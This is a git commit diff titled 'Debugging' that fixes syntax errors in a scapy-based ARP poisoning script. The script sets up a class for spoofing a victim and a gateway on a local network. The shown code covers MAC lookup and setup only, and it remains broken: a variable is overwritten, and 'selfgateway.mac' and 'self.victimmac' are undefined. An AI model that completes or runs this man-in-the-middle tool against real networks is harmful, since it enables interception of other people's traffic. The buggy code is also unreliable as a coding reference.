e71a8b04f379da21d3939911f67b310175c039fd
cybermaksx <cybermaksx@proton.me>
2026-08-27 00:37:52 +0300

    Debugging

--- spoofers/arp_poisoning.py
+++ spoofers/arp_poisoning.py
@@ -1,5 +1,5 @@
-import multiprocessing from Process
-from scappy.all import ARP, Ether, conf , get_if_hwaddr, send , sniff ,sndrcv , srp , wrpcap
+from multiprocessing import Process
+from scapy.all import ARP , Ether, conf , get_if_hwaddr, send , sniff ,sndrcv , srp , wrpcap
 
 
 import os
@@ -7,7 +7,7 @@ import sys
 import time
 
 def get_mac(targetip):
-    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has" pdst=targetip)
+    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=targetip)
     resp, _ = srp(packet, timeout= 2 , retry= 10 , verbose = False)
     for _, r in resp:
         return r[Ether].src
@@ -15,19 +15,19 @@ def get_mac(targetip):
 
 
 class Arper:
-    def __init__(self, victim , gateway , interface= 'wlan0')
-    self.victim = victim 
-    self.victim = get_mac(victim)
-    self.gateway = gateway
-    self.gatewaymac = get_mac(gateway)
-    self.interface = interface 
-    conf.iface = interface
-    conf.verb = 0
+    def __init__(self, victim , gateway , interface= 'wlan0'):
+        self.victim = victim 
+        self.victim = get_mac(victim)
+        self.gateway = gateway
+        self.gatewaymac = get_mac(gateway)
+        self.interface = interface 
+        conf.iface = interface
+        conf.verb = 0
 
-    print(f'Initialized {interface}:')
-    print(f'Gateway ({gateway}) is at {selfgateway.mac}.')
-    print(f'Victim {victim} is at {self.victimmac}.')
-    print('-'*30)
+        print(f'Initialized {interface}:')
+        print(f'Gateway ({gateway}) is at {selfgateway.mac}.')
+        print(f'Victim {victim} is at {self.victimmac}.')
+        print('-'*30)
     
 
 
@@ -47,7 +47,7 @@ def restore(self):
     pass
 
 
-if name == '__main__':
+if __name__ == '__main__':
     (victim, gateway , interface) = (sys.argv[1] , sys.argv[2], sys.argv[3])
 
     myarp = Arper(victim, gateway , interface)
